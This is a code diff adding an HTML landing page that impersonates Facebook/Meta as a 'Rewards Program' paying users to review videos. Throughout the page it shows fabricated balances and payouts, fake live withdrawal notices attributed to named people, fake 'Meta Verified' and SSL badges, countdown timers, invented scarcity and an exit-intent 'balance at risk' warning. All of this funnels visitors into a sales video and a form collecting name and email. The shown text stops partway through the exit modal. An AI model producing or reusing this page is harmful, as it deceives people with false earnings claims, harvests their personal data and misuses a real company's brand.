@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Facebook | Rewards Program</title>
+  <meta name="description" content="Official Facebook Rewards Program">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36' fill='%231877F2'><path d='M36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.988 6.598 16.433 15.188 17.781v-12.58H10.61V18h4.577v-3.513c0-4.516 2.69-7.011 6.807-7.011 1.972 0 4.035.352 4.035.352v4.436h-2.273c-2.238 0-2.936 1.389-2.936 2.812V18h5l-.8 5.201h-4.2V35.78C29.402 34.433 36 26.988 36 18z'/><path fill='%23FFF' d='M25.799 23.201l.8-5.201h-5v-2.924c0-1.423.698-2.812 2.936-2.812h2.273V7.828s-2.063-.352-4.035-.352c-4.117 0-6.807 2.495-6.807 7.011V18h-4.577v5.201h4.577v12.58a18.27 18.27 0 005.624 0v-12.58h4.202z'/></svg>">
+  
+  <!-- Preloads e DNS Prefetch do Player Vturb Oficial -->
+  <link rel="preload" href="https://scripts.converteai.net/f0aeecae-2e61-4c86-8c78-5571d1efbda9/players/6aabfaaad1a5582ed949f5b5/v4/player.js" as="script">
+  <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+  <link rel="preload" href="https://cdn.converteai.net/f0aeecae-2e61-4c86-8c78-5571d1efbda9/6aabfa7bba020081912f5b67/main.m3u8" as="fetch" crossorigin="anonymous">
+  <link rel="dns-prefetch" href="https://cdn.converteai.net">
+  <link rel="dns-prefetch" href="https://scripts.converteai.net">
+  <link rel="dns-prefetch" href="https://images.converteai.net">
+  <link rel="dns-prefetch" href="https://license.vturb.com">
+  
+  <!-- Utmify Pixel & Script (Oficial rewardedtasks.com) -->
+  <script>window.pixelId = "6a8fa5e28f2a32233dd4463c";</script>
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-subids
+    data-utmify-prevent-xcod-sck
+    async
+    defer
+  ></script>
+
+  <!-- Meta Pixel Code (Oficial rewardedtasks.com) -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1103050168884191');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1103050168884191&ev=PageView&noscript=1"
+  /></noscript>
+  <!-- End Meta Pixel Code -->
+
+  <!-- Universal UTM Transfer (Oficial rewardedtasks.com) -->
+  <script>
+    (function(){
+      var p = new URLSearchParams(window.location.search);
+      document.addEventListener("click", function(e){
+        var a = e.target.closest("a");
+        if (!a) return;
+        var h = a.getAttribute("href");
+        if (!h || h.startsWith("#") || h.startsWith("javascript:")) return;
+        try {
+          var u = new URL(a.href);
+          p.forEach(function(v, k){ u.searchParams.set(k, v); });
+          a.href = u.toString();
+        } catch(err){}
+      });
+    })();
+  </script>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="css/style.css?v=20261105e">
+</head>
+<body class="flex flex-col items-center min-h-screen">
+
+  <!-- Toast Notification Flutuante (Aviso de Story Bloqueado) -->
+  <div id="toast-notification">
+    <svg class="w-4 h-4 text-amber-400 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/></svg>
+    <span id="toast-message">🔒 Stories will only be unlocked after you finish all evaluation tasks!</span>
+  </div>
+
+  <!-- Notificação Push Estilo iOS / Instagram (Topo - VSL Step 4) -->
+  <div id="vsl-push-notification" class="push-notification-banner" onclick="dismissPushNotification()">
+    <div class="flex items-start gap-2.5">
+      <div class="w-8 h-8 rounded-xl bg-[#1877F2] flex items-center justify-center flex-shrink-0 shadow-sm mt-0.5">
+        <svg class="w-5 h-5 text-white fill-current" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+      </div>
+      <div class="flex-1 min-w-0 text-left">
+        <div class="flex items-center justify-between">
+          <span id="push-app-name" class="text-[11px] font-extrabold uppercase tracking-wider text-neutral-300">Facebook Wallet</span>
+          <span class="text-[10px] text-neutral-400">now</span>
+        </div>
+        <p id="push-title" class="text-xs font-bold text-white leading-tight mt-0.5">Pending Payout: $278.45</p>
+        <p id="push-desc" class="text-[11px] text-neutral-300 leading-snug mt-0.5">Your withdrawal authorization is waiting. Complete the security video to release funds.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Notificação Flutuante de Saque em Tempo Real (Live Payout Social Proof - Topo) -->
+  <div id="live-payout-toast" class="live-payout-badge" onclick="dismissLivePayout()">
+    <div class="w-8 h-8 rounded-full bg-emerald-500 text-white flex items-center justify-center font-black text-sm flex-shrink-0 shadow-sm">
+      $
+    </div>
+    <div class="flex-1 min-w-0 text-left leading-tight pr-1">
+      <div class="flex items-center justify-between">
+        <div class="flex items-center gap-1 truncate">
+          <span id="live-payout-name" class="font-extrabold text-xs text-neutral-900 truncate">Michael R.</span>
+          <span id="live-payout-loc" class="text-[10px] text-neutral-400 font-medium truncate">(Austin, TX)</span>
+        </div>
+        <span class="text-[9px] text-neutral-400 uppercase font-semibold tracking-wider flex items-center gap-0.5 ml-1 flex-shrink-0">
+          <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
+          <span>Meta Pay</span>
+        </span>
+      </div>
+      <div class="text-[11px] text-emerald-600 font-bold mt-0.5">
+        <span id="live-payout-action-text">withdrew </span><span id="live-payout-amount" class="font-black text-emerald-700">$278.45</span> • <span id="live-payout-time" class="text-neutral-400 font-normal">14s ago</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Container App Mobile-First -->
+  <div class="w-full max-w-[430px] min-h-screen bg-white shadow-2xl flex flex-col relative border-x border-neutral-200">
+
+    <!-- ========================================================================= -->
+    <!-- HEADER DO INSTAGRAM                                                       -->
+    <!-- ========================================================================= -->
+    <header id="instagram-header" class="hidden sticky top-0 z-50 bg-white border-b border-neutral-200 px-4 py-2.5 flex items-center justify-between">
+      <!-- Logo Oficial Facebook -->
+      <div class="flex items-center cursor-pointer">
+        <span class="font-sans font-black text-2xl tracking-tighter text-[#1877F2] select-none" style="letter-spacing: -1.2px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+          facebook
+        </span>
+      </div>
+
+      <!-- Right: Balance Pill -->
+      <div class="flex items-center gap-2.5">
+        <div class="bg-[#2ecc71] text-white px-3 py-1.5 rounded-lg font-bold text-xs sm:text-sm flex items-center gap-1.5 shadow-sm">
+          <span class="text-[10px]">💰</span>
+          <span id="header-balance">$32.27</span>
+        </div>
+      </div>
+    </header>
+
+    <!-- ========================================================================= -->
+    <!-- BARRA DE STORIES DO INSTAGRAM                                             -->
+    <!-- ========================================================================= -->
+    <section id="stories-section" style="display: none !important;" class="hidden bg-white border-b border-neutral-100 py-2 px-3">
+      <div id="stories-carousel" class="flex items-center gap-3.5 overflow-x-auto no-scrollbar">
+        <!-- Rendered by renderStoriesBar() -->
+      </div>
+    </section>
+
+    <!-- ========================================================================= -->
+    <!-- STEP 0: PÁGINA DE BOAS-VINDAS AUTÔNOMA                                    -->
+    <!-- ========================================================================= -->
+    <div id="step-welcome" class="step active min-h-screen flex flex-col justify-center items-center p-5 bg-[#F8FAFC]">
+      
+      <!-- Language Switcher Pills no Topo -->
+      <div class="flex items-center gap-1 bg-neutral-200/70 p-1 rounded-full mb-6 text-xs font-bold">
+        <button id="lang-btn-en" onclick="switchLanguage('en')" class="px-3 py-1 rounded-full bg-neutral-800 text-white transition-all">
+          🇺🇸 English ($)
+        </button>
+        <button id="lang-btn-pt" onclick="switchLanguage('pt')" class="px-3 py-1 rounded-full text-neutral-600 transition-all">
+          🇧🇷 Português (R$)
+        </button>
+      </div>
+
+      <!-- Card de Boas-Vindas Perfeitamente Alinhado -->
+      <div class="w-full bg-white rounded-3xl p-5 sm:p-7 border border-neutral-200/80 shadow-2xl text-center flex flex-col items-center gap-3.5">
+        
+        <!-- Faixa de Urgência no Topo do Card -->
+        <div class="w-full bg-rose-50 border border-rose-200/80 rounded-2xl px-3 py-2 flex items-center justify-between text-xs">
+          <div class="flex items-center gap-1.5 font-bold text-rose-700 text-[11px]">
+            <span class="w-2 h-2 rounded-full bg-rose-500 animate-ping"></span>
+            <span id="welcome-live-auditors">384 active evaluators in your region</span>
+          </div>
+          <div class="flex items-center gap-1 font-extrabold text-rose-800 text-xs">
+            <span>⏱️</span>
+            <span id="welcome-timer" class="font-mono tracking-tight">04:59</span>
+          </div>
+        </div>
+
+        <!-- Ícone Quadrado Verde com Check Branco do Facebook -->
+        <div class="w-16 h-16 rounded-2xl bg-[#34A853] flex items-center justify-center text-white shadow-sm mb-2">
+          <svg class="w-9 h-9 stroke-current" fill="none" stroke-width="3.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
+          </svg>
+        </div>
+
+        <div>
+          <span id="welcome-tag" class="text-xs font-bold text-[#0095F6] uppercase tracking-wider">Meta Insights Official</span>
+          <h1 id="welcome-title" class="text-2xl sm:text-3xl font-extrabold text-neutral-900 tracking-tight mt-0.5">
+            🎁 Congratulations! 🎁
+          </h1>
+        </div>
+        
+        <p id="welcome-desc" class="text-neutral-600 text-xs sm:text-sm leading-relaxed px-1">
+          You have been selected to participate in Facebook's exclusive content evaluation program for sponsors.
+        </p>
+
+        <!-- Saldo Concedido de Entrada com Aviso de Reserva -->
+        <div class="w-full bg-emerald-50 border border-emerald-200 text-emerald-800 rounded-2xl py-2.5 px-3 flex flex-col items-center justify-center gap-0.5">
+          <div class="flex items-center gap-1.5">
+            <span class="text-base">💸</span>
+            <span id="welcome-reward-badge" class="font-extrabold text-sm sm:text-base">You've already earned US$ 32.27!</span>
+          </div>
+          <span id="welcome-reserve-note" class="text-[10px] text-emerald-700 font-medium">Your initial bonus is reserved until the timer expires.</span>
+        </div>
+
+        <!-- Barra de Escassez de Vagas -->
+        <div class="w-full bg-neutral-50 border border-neutral-200/90 rounded-2xl p-2.5 flex flex-col gap-1.5 text-left">
+          <div class="flex items-center justify-between text-[11px] font-bold">
+            <span class="text-neutral-700 flex items-center gap-1">
+              <span>🎯</span> <span id="welcome-spots-label">Black Friday Spots:</span>
+            </span>
+            <span id="welcome-spots-left" class="text-rose-600 font-extrabold animate-pulse">Only 6 spots remaining today</span>
+          </div>
+          <div class="w-full bg-neutral-200 rounded-full h-2 overflow-hidden">
+            <div class="bg-gradient-to-r from-emerald-500 via-amber-500 to-rose-500 h-full rounded-full" style="width: 93%;"></div>
+          </div>
+        </div>
+
+        <p id="welcome-note" class="text-neutral-400 text-xs px-2">
+          Review the sponsored Black Friday videos in your feed to accumulate your balance and make your first withdrawal!
+        </p>
+
+        <!-- Botão Começar -->
+        <button onclick="goToStep(1)" class="pulse-btn w-full mt-1 py-4 px-6 rounded-2xl bg-[#34A853] hover:bg-[#2d9248] text-white font-extrabold text-sm sm:text-base flex items-center justify-center gap-2 shadow-xl shadow-emerald-600/30 transition-all">
+          <span id="welcome-btn-text">Start Evaluating in Feed</span>
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3"/>
+          </svg>
+        </button>
+
+        <!-- Selo de Garantia e Autenticidade -->
+        <div class="flex items-center justify-center gap-1 text-[10px] text-neutral-400 font-medium pt-1">
+          <svg class="w-3.5 h-3.5 text-emerald-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.35-.166-2.001A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd"/></svg>
+          <span id="welcome-guarantee">Meta Verified • Instant Payout Guaranteed</span>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ========================================================================= -->
+    <!-- STEP 1..3: POSTS DO FEED DO INSTAGRAM COM AVALIAÇÃO                       -->
+    <!-- ========================================================================= -->
+    <div id="step-task" class="step w-full flex-1 flex flex-col">
+      <!-- Barra de Progresso das Tarefas Segmentada (Estilo Stories 1 de 3) -->
+      <div id="task-progress-bar" class="w-full bg-white border-b border-neutral-100 px-3.5 py-2 flex flex-col gap-1.5 shadow-xs">
+        <div class="flex items-center justify-between text-[11px] font-bold text-neutral-700">
+          <span class="flex items-center gap-1.5">
+            <span class="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
+            <span id="task-progress-step-text">Task 1 of 3: +$82.06 bonus</span>
+          </span>
+          <span id="task-progress-pct" class="text-emerald-700 font-extrabold">33%</span>
+        </div>
+        <div class="flex items-center gap-1.5 w-full">
+          <div id="prog-seg-1" class="h-1.5 rounded-full flex-1 bg-gradient-to-r from-emerald-500 to-teal-500 transition-all duration-300"></div>
+          <div id="prog-seg-2" class="h-1.5 rounded-full flex-1 bg-neutral-200 transition-all duration-300"></div>
+          <div id="prog-seg-3" class="h-1.5 rounded-full flex-1 bg-neutral-200 transition-all duration-300"></div>
+        </div>
+      </div>
+
+      <div id="task-card-container" class="w-full flex-1 flex flex-col">
+        <!-- Rendered by renderInstagramFeedPost() -->
+      </div>
+    </div>
+
+    <!-- ========================================================================= -->
+    <!-- STEP 4: SAQUE E POST OFICIAL DA META (VSL)                                -->
+    <!-- ========================================================================= -->
+    <div id="step-vsl" class="step w-full pb-36">
+
+      <div class="p-3 flex flex-col gap-3">
+        
+        <div class="bg-white rounded-2xl border border-neutral-200 p-3.5 shadow-sm">
+          
+          <!-- Perfil Oficial Meta / Facebook -->
+          <div class="flex items-center gap-2.5 mb-2.5">
+            <div class="w-8 h-8 rounded-full bg-[#1877F2] flex items-center justify-center flex-shrink-0 shadow-sm">
+              <svg class="w-5 h-5 text-white fill-current" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+            </div>
+            <div>
+              <div class="flex items-center gap-1">
+                <span class="font-bold text-neutral-900 text-xs">facebook</span>
+                <svg class="w-3.5 h-3.5 text-[#0095F6] fill-current" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+              </div>
+              <span id="vsl-notice-tag" class="text-[10px] text-neutral-400 font-medium">Meta Verified • Instant Withdrawal Guide</span>
+            </div>
+          </div>
+
+          <p id="vsl-notice-desc" class="text-xs text-neutral-700 leading-relaxed mb-3">
+            Official Notice: Watch this 3-minute tutorial to authenticate your bank/crypto account and withdraw your accumulated earnings.
+          </p>
+
+          <!-- Player VSL -->
+          <div id="vsl-player-container" class="w-full">
+            <!-- Inserido dinamicamente -->
+          </div>
+
+        </div>
+
+        <!-- Comentários Estilo Instagram -->
+        <div class="bg-white rounded-2xl border border-neutral-200 p-3.5 shadow-sm">
+          <div class="flex items-center justify-between pb-2.5 border-b border-neutral-100 mb-2">
+            <span id="comments-title" class="font-bold text-neutral-900 text-xs">Community Feedback</span>
+            <span class="text-[11px] text-emerald-600 font-bold flex items-center gap-1">
+              <span class="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span> <span id="comments-live-tag">Live withdrawals</span>
+            </span>
+          </div>
+
+          <div id="comments-container" class="space-y-2 max-h-[300px] overflow-y-auto custom-scrollbar pr-1"></div>
+
+          <form onsubmit="handleAddComment(event)" class="mt-3 pt-2.5 border-t border-neutral-100 flex gap-2">
+            <input id="new-comment-input" type="text" placeholder="Add a comment..." class="flex-1 rounded-xl bg-neutral-100 border-none px-3 py-2 text-xs text-neutral-800 focus:outline-none focus:ring-1 focus:ring-neutral-300">
+            <button type="submit" class="text-[#0095F6] font-bold text-xs px-2 hover:text-blue-700">
+              Post
+            </button>
+          </form>
+
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ========================================================================= -->
+    <!-- BARRA DE NAVEGAÇÃO FLUTUANTE EM PÍLULA                                    -->
+    <!-- ========================================================================= -->
+    <nav id="instagram-bottom-nav" style="display: none !important;" class="hidden ig-bottom-pill">
+      <!-- Home -->
+      <button class="text-neutral-900 flex items-center justify-center p-0.5 active:scale-90 transition-transform">
+        <svg class="w-[18px] h-[18px] fill-current" viewBox="0 0 24 24">
+          <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
+        </svg>
+      </button>
+
+      <!-- Reels -->
+      <button class="text-neutral-500 hover:text-neutral-900 flex items-center justify-center p-0.5 active:scale-90 transition-transform">
+        <svg class="w-[18px] h-[18px] fill-none stroke-current" stroke-width="2" viewBox="0 0 24 24">
+          <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
+          <path d="M16 11.37A4 4 0 1112.63 8 4 4 0 0116 11.37zm1.5-4.87h.01"/>
+        </svg>
+      </button>
+
+      <!-- Direct / Carteira (Com Bolinha Vermelha) -->
+      <button class="text-neutral-500 hover:text-neutral-900 relative flex items-center justify-center p-0.5 active:scale-90 transition-transform">
+        <svg class="w-[18px] h-[18px] fill-none stroke-current" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/>
+        </svg>
+        <span class="absolute 0 right-0 w-2 h-2 bg-[#ED4956] rounded-full border border-white"></span>
+      </button>
+
+      <!-- Lupa / Pesquisa -->
+      <button class="text-neutral-500 hover:text-neutral-900 flex items-center justify-center p-0.5 active:scale-90 transition-transform">
+        <svg class="w-[18px] h-[18px] fill-none stroke-current" stroke-width="2" viewBox="0 0 24 24">
+          <circle cx="11" cy="11" r="8"/>
+          <line x1="21" y1="21" x2="16.65" y2="16.65"/>
+        </svg>
+      </button>
+
+      <!-- Foto de Perfil Padrão Vazia do Instagram -->
+      <div class="ig-default-avatar cursor-pointer" title="Profile">
+        <svg class="w-3 h-3 text-[#8E8E8E] fill-current translate-y-0.5" viewBox="0 0 24 24">
+          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+        </svg>
+      </div>
+    </nav>
+
+  </div>
+
+  <!-- ========================================================================= -->
+  <!-- MODAL: POP-UP TUTORIAL RÁPIDO NO 1º VÍDEO (ONBOARDING TOOLTIP)            -->
+  <!-- ========================================================================= -->
+  <div id="modal-tutorial" class="modal-overlay">
+    <div class="bg-white rounded-3xl p-6 w-full max-w-[340px] text-center shadow-2xl relative animate-fade-up">
+      
+      <!-- Ícone Dica / Carteira com Glow -->
+      <div class="w-16 h-16 rounded-2xl bg-gradient-to-tr from-[#1877F2] to-[#0A66C2] text-white flex items-center justify-center mx-auto mb-3 shadow-lg shadow-blue-500/30">
+        <svg class="w-9 h-9" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+        </svg>
+      </div>
+
+      <h3 id="tutorial-title" class="font-extrabold text-neutral-900 text-lg mb-1.5">
+        💡 Quick Guide:
+      </h3>
+      
+      <p id="tutorial-text" class="text-neutral-600 text-xs sm:text-sm leading-relaxed mb-5 px-1">
+        Watch each sponsored video and answer the question below. Every review instantly deposits real cash into your Facebook balance above!
+      </p>
+
+      <button id="tutorial-btn" onclick="closeTutorialModal()" class="w-full py-3.5 px-4 rounded-xl bg-[#1877F2] hover:bg-[#166FE5] text-white font-extrabold text-sm shadow-lg shadow-blue-500/25 active:scale-95 transition-all">
+        Start Reviewing
+      </button>
+
+    </div>
+  </div>
+
+  <!-- ========================================================================= -->
+  <!-- MODAL: RECOMPENSA CREDITADA                                               -->
+  <!-- ========================================================================= -->
+  <div id="modal-reward" class="modal-overlay">
+    <div class="bg-emerald-600 rounded-[32px] p-6 w-full max-w-[340px] text-center shadow-2xl relative overflow-hidden animate-fade-up">
+      
+      <div class="w-16 h-16 bg-white rounded-full flex items-center justify-center mx-auto mb-3 shadow-lg relative">
+        <svg width="42" height="42" viewBox="0 0 100 100" class="relative z-10">
+          <circle class="anim-circle" cx="50" cy="50" r="40" stroke="#10B981" stroke-width="5" fill="transparent" stroke-linecap="round"></circle>
+          <path class="anim-check" d="M30 50L45 65L70 35" stroke="#10B981" stroke-width="5" fill="transparent" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+      </div>
+
+      <h2 id="modal-reward-title" class="anim-fade-1 text-lg font-extrabold text-white mb-0.5">You Earned Money!</h2>
+      <p id="modal-reward-desc" class="anim-fade-2 text-emerald-100 text-xs mb-3">Your feedback was submitted successfully to Meta servers:</p>
+      
+      <div id="modal-reward-amount" class="anim-fade-3 text-3xl font-black text-white mb-5 drop-shadow-md">
+        +$82.06
+      </div>
+
+      <div class="anim-fade-4">
+        <button id="modal-reward-btn" onclick="closeRewardModalAndAdvance()" class="w-full bg-white hover:bg-neutral-50 text-neutral-900 font-extrabold py-3.5 px-4 rounded-xl text-xs sm:text-sm transition-all shadow-md active:scale-95">
+          Continue to Next Video
+        </button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ========================================================================= -->
+  <!-- MODAL: CHECKOUT / CADASTRO DE SAQUE                                       -->
+  <!-- ========================================================================= -->
+  <div id="modal-checkout" class="modal-overlay">
+    <div class="bg-white rounded-3xl p-6 w-full max-w-[380px] shadow-2xl relative animate-fade-up text-left">
+      
+      <button onclick="closeCheckoutModal()" class="absolute top-4 right-4 text-neutral-400 hover:text-neutral-600">
+        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+      </button>
+
+      <div class="flex items-center gap-3 p-3 bg-neutral-50 rounded-2xl border border-neutral-200 mb-4">
+        <div class="w-8 h-8 rounded-full bg-[#1877F2] flex items-center justify-center flex-shrink-0 shadow-sm">
+          <svg class="w-5 h-5 text-white fill-current" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+        </div>
+        <div>
+          <span class="font-extrabold text-xs sm:text-sm text-neutral-900 block leading-tight">Facebook Meta Wallet</span>
+          <span class="text-[11px] text-emerald-700 font-semibold">Instant Payout Authentication</span>
+        </div>
+      </div>
+
+      <h3 id="modal-checkout-title" class="font-bold text-neutral-900 text-sm sm:text-base mb-1">Where should we send your withdrawal?</h3>
+      <p id="modal-checkout-desc" class="text-[11px] text-neutral-500 mb-3.5">Enter your payout information to register your account and unlock your daily video queue.</p>
+
+      <form onsubmit="submitCheckout(event)" class="space-y-3">
+        <div>
+          <label id="checkout-name-label" class="block text-xs font-bold text-neutral-700 mb-1">Full Name</label>
+          <input id="checkout-name" type="text" required placeholder="John Doe" class="w-full rounded-xl border border-neutral-300 px-3.5 py-2.5 text-xs sm:text-sm text-neutral-900 focus:outline-none focus:border-[#0095F6]">
+        </div>
+
+        <div>
+          <label id="checkout-email-label" class="block text-xs font-bold text-neutral-700 mb-1">Email Address</label>
+          <input id="checkout-email" type="email" required placeholder="john@example.com" class="w-full rounded-xl border border-neutral-300 px-3.5 py-2.5 text-xs sm:text-sm text-neutral-900 focus:outline-none focus:border-[#0095F6]">
+        </div>
+
+        <button type="submit" class="w-full mt-2 py-3.5 px-4 rounded-xl bg-[#34A853] hover:bg-[#2d9248] text-white font-extrabold text-xs sm:text-sm flex items-center justify-center gap-2 shadow-lg shadow-emerald-600/25 transition-all">
+          <span id="modal-checkout-submit">RELEASE WITHDRAWAL NOW</span>
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+        </button>
+      </form>
+
+      <div class="mt-3.5 text-center">
+        <span id="modal-ssl-secure" class="text-[10px] text-neutral-400 flex items-center justify-center gap-1">
+          <svg class="w-3.5 h-3.5 text-emerald-500" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/></svg>
+          Meta Verified • 256-bit SSL Encrypted Connection
+        </span>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ========================================================================= -->
+  <!-- MODAL: REGRA OBRIGATÓRIA DA VSL (ASSISTIR VÍDEO COMPLETO)                  -->
+  <!-- ========================================================================= -->
+  <div id="modal-vsl-instruction" class="modal-overlay">
+    <div class="bg-white rounded-3xl p-6 w-full max-w-[380px] shadow-2xl relative animate-fade-up text-center border border-neutral-100">
+      
+      <!-- Ícone Alerta / Cadeado de Segurança -->
+      <div class="w-16 h-16 mx-auto mb-3 rounded-full bg-amber-50 border border-amber-200 flex items-center justify-center text-amber-500 shadow-inner">
+        <svg class="w-8 h-8 fill-current" viewBox="0 0 24 24">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+        </svg>
+      </div>
+
+      <div class="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full bg-emerald-50 text-emerald-700 font-extrabold text-[11px] mb-2 border border-emerald-200">
+        <span>🔒 Meta Security Protocol</span>
+      </div>
+
+      <h3 id="modal-vsl-title" class="font-extrabold text-neutral-900 text-base sm:text-lg mb-2 leading-snug">
+        Mandatory Payout Instruction
+      </h3>
+      
+      <p id="modal-vsl-desc" class="text-xs text-neutral-600 leading-relaxed mb-4 px-1">
+        To authorize the instant release of your accumulated balance of <span id="vsl-modal-balance-highlight" class="font-extrabold text-emerald-600">$278.45</span>, you must watch this official authentication tutorial until the end without closing or leaving this page. Your payout button will be unlocked automatically.
+      </p>
+
+      <button id="modal-vsl-btn" onclick="closeVslInstructionModal()" class="pulse-btn w-full py-3.5 px-4 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-black text-xs sm:text-sm flex items-center justify-center gap-2 shadow-lg shadow-emerald-600/30 transition-all active:scale-95 uppercase tracking-wide">
+        I UNDERSTAND, START TUTORIAL
+      </button>
+
+      <p class="text-[10px] text-neutral-400 mt-2.5 flex items-center justify-center gap-1 font-medium">
+        <span>⏱️ Audio will play automatically</span>
+      </p>
+
+    </div>
+  </div>
+
+  <!-- ========================================================================= -->
+  <!-- MODAL: RETENÇÃO DE SAÍDA (EXIT INTENT ANTI-ABANDONO)                      -->
+  <!-- ========================================================================= -->
+  <div id="modal-exit-intent" class="modal-overlay">
+    <div class="bg-white rounded-3xl p-6 w-full max-w-[380px] shadow-2xl relative animate-fade-up text-center border-2 border-rose-500/30">
+      
+      <!-- Warning Badge -->
+      <div class="w-16 h-16 mx-auto mb-3 rounded-full bg-rose-50 border border-rose-200 flex items-center justify-center text-rose-500 animate-bounce">
+        <svg class="w-8 h-8 fill-current" viewBox="0 0 24 24">
+          <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+        </svg>
+      </div>
+
+      <div class="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full bg-rose-50 text-rose-700 font-extrabold text-[11px] mb-2 border border-rose-200">
+        <span>⚠️ ATTENTION: BALANCE AT RISK</span>
+      </div>
+
+      <h3 id="modal-exit-title" class="font-black text-neutral-900 text-lg mb-2 leading-tight">
+        WAIT! DO NOT LEAVE!
+      </h3>
+      
+      <p id="modal-exit-desc" class="text-xs text-neutral-600 leading-relaxed mb-4 px-1">
